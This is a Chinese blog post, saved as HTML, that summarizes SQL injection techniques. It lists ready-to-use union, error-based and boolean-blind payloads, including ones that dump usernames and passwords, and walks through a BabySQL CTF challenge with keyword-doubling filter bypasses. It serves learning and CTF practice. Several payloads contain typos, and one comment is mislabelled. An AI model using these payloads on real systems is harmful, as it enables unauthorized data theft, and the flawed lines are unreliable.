@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql注入总结 | fyのblog</title><meta name="description" content="数组库基本介绍mysql数据库 MYSQL有一个默认的内置数据库，信息数据库information_schema 其中有三个重要的表，分别是schemate，tables，columns   schemate表 包含了所有数据库的名称schema_name tables表 包含了数据库所有表 (table_schema,table_name) columns表 包含了数据包所有的字段（table_"><meta name="keywords" content="sql"><meta name="author" content="fy"><meta name="copyright" content="fy"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sql注入总结"><meta name="twitter:description" content="数组库基本介绍mysql数据库 MYSQL有一个默认的内置数据库，信息数据库information_schema 其中有三个重要的表，分别是schemate，tables，columns   schemate表 包含了所有数据库的名称schema_name tables表 包含了数据库所有表 (table_schema,table_name) columns表 包含了数据包所有的字段（table_"><meta name="twitter:image" content="https://i.loli.net/2020/07/07/iPouMdnSKlF2fm5.jpg"><meta property="og:type" content="article"><meta property="og:title" content="sql注入总结"><meta property="og:url" content="http://fybc.xyz/posts/13153/"><meta property="og:site_name" content="fyのblog"><meta property="og:description" content="数组库基本介绍mysql数据库 MYSQL有一个默认的内置数据库，信息数据库information_schema 其中有三个重要的表，分别是schemate，tables，columns   schemate表 包含了所有数据库的名称schema_name tables表 包含了数据库所有表 (table_schema,table_name) columns表 包含了数据包所有的字段（table_"><meta property="og:image" content="https://i.loli.net/2020/07/07/iPouMdnSKlF2fm5.jpg"><meta property="article:published_time" content="2020-07-02T09:38:36.000Z"><meta property="article:modified_time" content="2020-07-17T07:55:44.755Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
+var t = Cookies.get("theme")
+if (autoChangeMode == '1'){
+  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
+  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
+  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined){
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport){
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour < 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+  }
+  } else if (t == 'light') activateLightMode()
+  else activateDarkMode()
+
+} else if (autoChangeMode == '2'){
+  now = new Date();
+  hour = now.getHours();
+  isNight = hour < 6 || hour >= 18
+  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode() 
+} else {
+  if ( t == 'dark' ) activateDarkMode()
+  else if ( t == 'light') activateLightMode()
+}
+
+function activateDarkMode(){
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
+  }
+}
+function activateLightMode(){
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null){
+  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
+  }
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://fybc.xyz/posts/13153/"><link rel="prev" title="内网渗透" href="http://fybc.xyz/posts/27105/"><link rel="next" title="markdown" href="http://fybc.xyz/posts/23825/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><link rel="stylesheet" href="APlayer.min.css"><div id="aplayer"></div><script src="https://cdn.jsdelivr.net/gh/radium-bit/res@master/live2d/autoload.js" async></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="fyのblog" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/f1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">6</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">9</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-film"></i><span> 照片</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数组库基本介绍"><span class="toc-number">1.</span> <span class="toc-text">数组库基本介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql数据库"><span class="toc-number">1.1.</span> <span class="toc-text">mysql数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver数据库"><span class="toc-number">1.2.</span> <span class="toc-text">sqlserver数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle数据库"><span class="toc-number">1.3.</span> <span class="toc-text">Oracle数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入数据库判断"><span class="toc-number">1.4.</span> <span class="toc-text">sql注入数据库判断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入"><span class="toc-number">2.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的函数"><span class="toc-number">2.1.</span> <span class="toc-text">用到的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">2.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题"><span class="toc-number">2.3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-BabySQL"><span class="toc-number">2.3.1.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver数据库-1"><span class="toc-number">2.4.</span> <span class="toc-text">sqlserver数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle数据库"><span class="toc-number">2.5.</span> <span class="toc-text">oracle数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#报错注入"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#产生原因"><span class="toc-number">3.1.</span> <span class="toc-text">产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xpath语法错误"><span class="toc-number">3.2.</span> <span class="toc-text">Xpath语法错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue函数"><span class="toc-number">3.2.1.</span> <span class="toc-text">extractvalue函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml函数"><span class="toc-number">3.2.2.</span> <span class="toc-text">updatexml函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注意"><span class="toc-number">3.2.3.</span> <span class="toc-text">注意</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor与group-by报错"><span class="toc-number">3.3.</span> <span class="toc-text">floor与group by报错</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用函数"><span class="toc-number">3.3.1.</span> <span class="toc-text">使用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-3"><span class="toc-number">3.3.2.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#整形溢出报错注入"><span class="toc-number">3.4.</span> <span class="toc-text">整形溢出报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#报错payload"><span class="toc-number">3.4.1.</span> <span class="toc-text">报错payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#几何函数报错注入"><span class="toc-number">3.5.</span> <span class="toc-text">几何函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关函数"><span class="toc-number">3.5.1.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#列名重复报错注入"><span class="toc-number">3.6.</span> <span class="toc-text">列名重复报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver数据库-2"><span class="toc-number">3.7.</span> <span class="toc-text">sqlserver数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle数据库-1"><span class="toc-number">3.8.</span> <span class="toc-text">Oracle数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔盲注"><span class="toc-number">4.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数"><span class="toc-number">4.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-6"><span class="toc-number">4.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python脚本"><span class="toc-number">4.3.</span> <span class="toc-text">python脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver数据库-3"><span class="toc-number">4.4.</span> <span class="toc-text">sqlserver数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle数据库-2"><span class="toc-number">4.5.</span> <span class="toc-text">Oracle数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">4.6.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#时间盲注"><span class="toc-number">5.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#函数-1"><span class="toc-number">5.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-7"><span class="toc-number">5.2.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#堆叠注入"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二次注入"><span class="toc-number">7.</span> <span class="toc-text">二次注入</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://i.loli.net/2020/07/07/iPouMdnSKlF2fm5.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">fyのblog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 娱乐</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-film"></i><span> 照片</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sql注入总结</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-07-02 17:38:36"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-07-02</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-07-17 15:55:44"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-07-17</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">3.1k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 13 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-comment-o" aria-hidden="true"></i><span>评论数:</span><a href="/posts/13153/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count comment-count" data-xid="/posts/13153/" itemprop="commentCount"></span></a></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="数组库基本介绍"><a href="#数组库基本介绍" class="headerlink" title="数组库基本介绍"></a>数组库基本介绍</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><ul>
+<li>MYSQL有一个默认的内置数据库，信息数据库information_schema<blockquote>
+<p>其中有三个重要的表，分别是schemate，tables，columns</p>
+<blockquote>
+<ol>
+<li>schemate表 包含了所有数据库的名称schema_name</li>
+<li>tables表 包含了数据库所有表 (table_schema,table_name)</li>
+<li>columns表 包含了数据包所有的字段（table_schema,table_name,column_name)</li>
+</ol>
+</blockquote>
+</blockquote>
+</li>
+<li>mysql内置函数<blockquote>
+<p>user() 查看当前数据库账号的用户名<br>version() 查看当前数据库的版本<br>database() 查看当前所在查询的数据库名<br>@@datadir 查看当前数据库所在物理路径</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><h2 id="sql注入数据库判断"><a href="#sql注入数据库判断" class="headerlink" title="sql注入数据库判断"></a>sql注入数据库判断</h2><hr>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="用到的函数"><a href="#用到的函数" class="headerlink" title="用到的函数"></a>用到的函数</h2><ul>
+<li>union select 联合查询，每个查询必须包含相同的列</li>
+<li>order by 判断列数</li>
+<li>limit 0,1 //0是起始位置，1是偏移量，即从第0行开始，偏移一位，查询一行数据<br>先判断是否存在回显，然后判断列数，再使用union select 列数判断出回显的一个位置，对回显的位置进行注入</li>
+</ul>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote>
+<p>union select group_concat(schema_name) from information_schema.schemate //查询所有的数据库<br>union selectt group_concat(table_name) from information_schame.tables where table_schema=database()   //查询当前数据库所有的表名<br>union select group_concat(cloumn_name) from information_schema.columns<br>where table_schema=database() and table_name=’users’ //查询当前数据库users表中所有的字段<br>union select group_concat(concat_ws(‘:’,username,password)) from users<br>//查询users表中的数据使用concat_ws拼接两个字段的数据 </p>
+</blockquote>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a><em>[极客大挑战 2019]BabySQL</em></h3><p><img src="/img/babysql1.PNG" alt=""></p>
+<ul>
+<li>进行网址后，发现是登录界面，根据题目猜测存在sql注入，先尝试进行常规操作<blockquote>
+<p>username=admin&amp;password=12’or 1=1%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql2.PNG" alt=""><br>这里返回了‘1=1#’错误，说明or是被过滤了，尝试双写绕过<br>使用oorr来绕过replace</p>
+<blockquote>
+<p>username=admin&amp;password=12’oorr 1=1%23</p>
+</blockquote>
+<p><img src="/img/babysql3.PNG" alt=""></p>
+<ul>
+<li><p>页面成功回显了，再使用order by判断列数</p>
+</li>
+<li><p>这里经过测试后，发现order by，from，for都被过滤了，需要双写</p>
+</li>
+<li><p>order by 3时正常，order by4时报错，猜测有3列</p>
+<blockquote>
+<p>username=admin&amp;password=12’ oorrder bbyy 4%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql4.PNG" alt=""></p>
+<ul>
+<li>再使用union select 1,2,3来判断回显位置。因为union select被过滤了，需要双写<blockquote>
+<p>username=admin&amp;password=12’ ununionion seselectlect 1,2,3%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql5.PNG" alt=""></p>
+<ul>
+<li><p>成功回显了2，3，即下一步就是在2，3的位置进行操作</p>
+</li>
+<li><p>下一步就是判断当前数据库，和所有的数据库名称,同样要进行双写</p>
+<blockquote>
+<p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(schema_name) frofromm infoorrmation_schema.schemata%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql6.PNG" alt=""></p>
+<ul>
+<li>成功返回当前数据库为geek，有test,ctf,geek三个自建数据库，猜测flag在ctf数据库中。然后就是得到ctf数据库的表名<blockquote>
+<p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema=’ctf’%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql7.PNG" alt=""></p>
+<ul>
+<li>得到数据库一个表名Flag，再判断表名中的字段<blockquote>
+<p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),group_concat(column_name) frofromm infoorrmation_schema.columns whewherere table_schema=’ctf’ anandd table_name=’Flag’%23</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="/img/babysql8.PNG" alt=""></p>
+<ul>
+<li>得到一个字段flag，查看字段数据</li>
+</ul>
+<blockquote>
+<p>username=admin&amp;password=12’ ununionion seselectlect 1,database(),flag frfromom ctf.Flag%23</p>
+</blockquote>
+<p><img src="/img/babysql9.PNG" alt=""></p>
+<ul>
+<li>数据在ctf的Flag表中，成功得到flag</li>
+</ul>
+<h2 id="sqlserver数据库-1"><a href="#sqlserver数据库-1" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="oracle数据库"><a href="#oracle数据库" class="headerlink" title="oracle数据库"></a>oracle数据库</h2><hr>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>当前的查询存在一个报错的时候可以尝试使用报错注入，可以和union一起使用，当union select<br>被过滤的情况下可以考虑使用报错注入，报错注入是人为的制造错误，使查询语句能够出现在错误信息中</p>
+<h2 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h2><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><ul>
+<li>函数原型：extractvalue(xml_document,Xpath_string)<blockquote>
+<p>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><blockquote>
+<p>id=1’ and extractvalue(1,concat(0x7e,(select version())))<br>//查询版本号<br>id=1’ and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())))<br>//查询当前数据库的表</p>
+</blockquote>
+<h3 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h3><ul>
+<li>函数原型：updatexml(xml_document,xpath_string,new_value)<blockquote>
+<p>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值<br>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><blockquote>
+<p>id=1’and updatexml(1,concat(0x7e,(select version())),1)</p>
+</blockquote>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol>
+<li>使用 extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li>
+<li>0x7e就是’~‘,可以换成’#’、’$’等不满足xpath格式的字符</li>
+</ol>
+<h2 id="floor与group-by报错"><a href="#floor与group-by报错" class="headerlink" title="floor与group by报错"></a>floor与group by报错</h2><h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><blockquote>
+<p>rand() 表示0-1的随机值<br>floor（） 向下取整<br>count() 统计行数<br>group up 分组 字段是唯一的，是主键<br>floor(rand(0))*2会生成随机的0或1</p>
+</blockquote>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><blockquote>
+<p>id=admin’ union select 1,count(1) from information_schema.tables group by concat(foloor(rand()*2),database())#  //查看数据库版本<br>‘union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a–+<br>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p>
+</blockquote>
+<h2 id="整形溢出报错注入"><a href="#整形溢出报错注入" class="headerlink" title="整形溢出报错注入"></a>整形溢出报错注入</h2><ul>
+<li>exp(x) 数学函数 返回值 e (自然对数的底) 的 x 次方</li>
+</ul>
+<h3 id="报错payload"><a href="#报错payload" class="headerlink" title="报错payload"></a>报错payload</h3><blockquote>
+<p>and exp(~(select * from(select user())a));</p>
+</blockquote>
+<h2 id="几何函数报错注入"><a href="#几何函数报错注入" class="headerlink" title="几何函数报错注入"></a>几何函数报错注入</h2><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>geometrycollection()<br>multipoint()<br>polygon()<br>multipolygon()<br>linestring()<br>multilinestring()</p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><blockquote>
+<p>and geometrycollection((select * from(select * from(select user())a)b));<br>and multipoint((select * from(select * from(select user())a)b))<br>and polygon((select * from(select * from(select user())a)b))<br>and multipolygon((select * from(select * from(select user())a)b))<br>and linestring((select * from(select * from(select user())a)b))<br>and multilinestring((select * from(select * from(select user())a)b))</p>
+</blockquote>
+<ul>
+<li>函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错,但是，上述函数经本地测试，本地高版本MySQL无法得到数据（5.6.22）</li>
+</ul>
+<h2 id="列名重复报错注入"><a href="#列名重复报错注入" class="headerlink" title="列名重复报错注入"></a>列名重复报错注入</h2><ul>
+<li>name_const()函数　</li>
+<li>name_const(name,value)函数会用传入的参数返回一列结果集.传入的参数必须是常量，如果不是则报错,修改name使之报错<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><blockquote>
+<p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;<br>因为两列列名相同,外面选择时候报错,说重复列，暂时只能用version（）</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="sqlserver数据库-2"><a href="#sqlserver数据库-2" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库-1"><a href="#Oracle数据库-1" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><hr>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><ul>
+<li>看不见数据库的报错，看不见数据库返回的数据，通过页面状态变换来判断字符的数据</li>
+</ul>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><blockquote>
+<p>substr() 截取参数，有三个参数，第一个是要截取的字符串，第二个是截取字符串的起始位置，第三个是规定要返回的字符串长度。默认是直到字符串的结尾。</p>
+<blockquote>
+<p>substr(xx from 32)  //如果为32位。相当于取第32位，from 1 就是从第一位到最后一位<br>substr(xx from 31)  //from 31 相当于取从31到32两位，这时只能使用字符串比较，而不能使用ascii</p>
+<blockquote>
+<p>substr(xx from 1 for 1) 从一开始，截取一个=substr(xx,1,1)<br>+可以搭配substr使用，用’0’来闭合</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>length() 判断长度</p>
+</blockquote>
+<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><blockquote>
+<p>?id=-1’ or (select substr(version(),1,1 )=’5’)#  //截取version的第一个字符与AScii码做比较，如果为真则页面返回正常，如果为假则返回错误，一个个进行比较来查看<br>?id=-1’ or (select substr(table_name,2,1) from information_schema.tables<br>where table_schema=database() limit 0,1)=’m’#  //查询当前数据库的第一个表的第二个字符是否等于m，是则页面正常，limit来控制列数，substr来控制列的第几个字符<br>?id=-1’ or (select ascii(substr(table_name,1,1)) from information_schema.tables<br>where table_schema=database() limit 0,1)=101%23  //把里面字符转为ASCII码，在比较128位ascii码与字符是否相等</p>
